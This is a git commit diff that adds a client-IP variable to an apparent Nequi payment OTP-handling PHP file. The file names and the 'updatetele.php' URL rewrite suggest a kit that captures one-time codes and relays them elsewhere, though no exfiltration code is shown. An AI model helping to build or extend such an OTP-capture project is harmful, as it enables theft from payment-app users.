30267ff3feac47108292421d1cda99e16b4d3292
jeycolorft420 <jeycolorft@gmail.com>
2026-01-09 21:52:09 -0500

    Restore missing ip_cliente variable in Nequi OTP files

--- pago/nequi/process/otpserror.php
+++ pago/nequi/process/otpserror.php
@@ -36,6 +36,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Ajustar URL para usar el script específico de Nequi
         $baseUrl = $config['baseUrl'];
         $security_key = $config['security_key'];
+        $ip_cliente = $_SERVER['REMOTE_ADDR'];
         $nequiBaseUrl = $baseUrl;
         if (strpos($baseUrl, 'updatetele.php') !== false) {
             $nequiBaseUrl = str_replace('updatetele.php', 'pago/nequi/process/updatetele.php', $baseUrl);
